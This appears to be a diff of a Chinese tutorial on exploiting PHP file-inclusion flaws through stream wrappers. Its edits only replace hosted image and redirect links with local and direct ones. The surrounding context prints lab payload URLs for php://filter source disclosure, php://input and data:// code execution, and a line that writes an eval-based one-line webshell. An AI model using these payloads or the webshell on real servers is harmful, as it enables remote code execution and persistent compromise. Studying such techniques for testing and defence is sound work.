@@ -62,7 +62,7 @@ $$
      http://127.0.0.1/include.php?file=file://E:\phpStudy\PHPTutorial\WWW\phpinfo.txt
      ```
 
-     ![图片描述](https://segmentfault.com/img/bVbrQAZ)
+     ![图片描述](/markdown/images/bVbrQAZ.png)
 
   2. `[文件的相对路径和文件名]`
 
@@ -70,7 +70,7 @@ $$
      http://127.0.0.1/include.php?file=./phpinfo.txt
      ```
 
-     ![图片描述](https://segmentfault.com/img/bVbrQA1)
+     ![图片描述](/markdown/images/bVbrQA1.png/)
 
   3. `[http：//网络路径和文件名]`
 
@@ -78,9 +78,9 @@ $$
      http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt
      ```
 
-     ![图片描述](https://segmentfault.com/img/bVbrQBb)
+     ![图片描述](/markdown/images/bVbrQBb.png)
 
-- **参考**：[http://php.net/manual/zh/wrappers.file.php](https://link.segmentfault.com/?enc=Zs%2BV9V4IQjWtiWthYKTf7g%3D%3D.HSkQG0PoZxzinna9Q2UvU3B72JU4d5ibg7mMch63ACnyzAC8C0Ahq4V16VoueluX)
+- **参考**：[http://php.net/manual/zh/wrappers.file.php](http://php.net/manual/zh/wrappers.file.php)
 
 # php://协议
 
@@ -117,7 +117,7 @@ $$
 
 - **可用的过滤器列表（4类）**
 
-  此处列举主要的过滤器类型，详细内容请参考：[https://www.php.net/manual/zh/filters.php](https://link.segmentfault.com/?enc=wIZh8GGyRk3IEBh%2FUyUwzA%3D%3D.b6GiZXFMQmM5RkX2Dsjom4IZxNKVzsqmyV5i3GihFmQQ1jBc0kVnqXYmQd6sbGAu)
+  此处列举主要的过滤器类型，详细内容请参考：[https://www.php.net/manual/zh/filters.php](https://www.php.net/manual/zh/filters.php)
 
   | 字符串过滤器      | 作用                                        |
   | ----------------- | ------------------------------------------- |
@@ -149,7 +149,7 @@ $$
      http://127.0.0.1/include.php?file=php://filter/read=convert.base64-encode/resource=phpinfo.php
      ```
 
-     ![图片描述](https://segmentfault.com/img/bVbrQBf)
+     ![图片描述](/markdown/images/bVbrQBf.webp)
 
   2. `php://input + [POST DATA]`执行php代码
 
@@ -159,7 +159,7 @@ $$
      <?php phpinfo(); ?>
      ```
 
-     ![图片描述](https://segmentfault.com/img/bVbrQBh)
+     ![图片描述](/markdown/images/bVbrQBh.webp)
 
      若有写入权限，写入一句话木马
 
@@ -169,9 +169,9 @@ $$
      <?php fputs(fopen('1juhua.php','w'),'<?php @eval($_GET[cmd]); ?>'); ?>
      ```
 
-     ![图片描述](https://segmentfault.com/img/bVbrQBi)
+     ![图片描述](/markdown/images/bVbrQBi.webp)
 
-- **参考**：[https://php.net/manual/zh/wrappers.php.php](https://link.segmentfault.com/?enc=M1juvEoIxwaVBQUt7Tp6fw%3D%3D.tNdVZ1zzLh2RIgxaZ1qC%2FCbpUriZlH06YCeNMzk7XwFU2YRne3WaF0zmzDoHwkik)
+- **参考**：[https://php.net/manual/zh/wrappers.php.php](https://php.net/manual/zh/wrappers.php.php)
 
 # zip:// & bzip2:// & zlib://协议
 
@@ -192,7 +192,7 @@ $$
      http://127.0.0.1/include.php?file=zip://E:\phpStudy\PHPTutorial\WWW\phpinfo.jpg%23phpinfo.txt
      ```
 
-     ![图片描述](https://segmentfault.com/img/bVbrQBj)
+     ![图片描述](/markdown/images/bVbrQBj.webp)
 
   2. `compress.bzip2://file.bz2`
 
@@ -202,7 +202,7 @@ $$
      http://127.0.0.1/include.php?file=compress.bzip2://E:\phpStudy\PHPTutorial\WWW\phpinfo.bz2
      ```
 
-     ![图片描述](https://segmentfault.com/img/bVbrQBt)
+     ![图片描述](/markdown/images/bVbrQBt.webp)
 
   3. `compress.zlib://file.gz`
 
@@ -212,9 +212,9 @@ $$
      http://127.0.0.1/include.php?file=compress.zlib://E:\phpStudy\PHPTutorial\WWW\phpinfo.gz
      ```
 
-     ![图片描述](https://segmentfault.com/img/bVbrQBu)
+     ![图片描述](/markdown/images/bVbrQBu.webp)
 
-- **参考**：[http://php.net/manual/zh/wrappers.compression.php](https://link.segmentfault.com/?enc=zJUyCYTLNfleI%2B8YOt%2BrYg%3D%3D.esu6o2ZLvqoGBGlX1twgTBF71uamzhsFwEf74uEXrPFdCYCQwtm0Jlv2Sl25FZlL21NhgufVnc5pp1NlAnnNoQ%3D%3D)
+- **参考**：[http://php.net/manual/zh/wrappers.compression.php](http://php.net/manual/zh/wrappers.compression.php)
 
 # data:// 协议
 
@@ -240,7 +240,7 @@ $$
      http://127.0.0.1/include.php?file=data://text/plain,<?php%20phpinfo();?>
      ```
 
-     ![图片描述](https://segmentfault.com/img/bVbrQBB)
+     ![图片描述](/markdown/images/bVbrQBB.webp)
 
   2. `data://text/plain;base64,`
 
@@ -248,7 +248,7 @@ $$
      http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b
      ```
 
-     ![图片描述](https://segmentfault.com/img/bVbrQBD)
+     ![图片描述](/markdown/images/bVbrQBD.webp)
 
 # http:// & https://协议
 
@@ -276,7 +276,7 @@ $$
   http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt
   ```
 
-  ![图片描述](https://segmentfault.com/img/bVbrQBP)
+  ![图片描述](/markdown/images/bVbrQBP.webp)
 
 # phar://协议
 
@@ -286,7 +286,7 @@ $$
 http://127.0.0.1/include.php?file=phar://E:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt
 ```
 
-![图片描述](https://segmentfault.com/img/bVbrQBX)
+![图片描述](/markdown/images/bVbrQBX.webp)
 
 另外在 Black Hat 2018 大会上，研究人员公布了一款针对PHP应用程序的全新攻击技术：**phar://协议对象注入技术**。
 
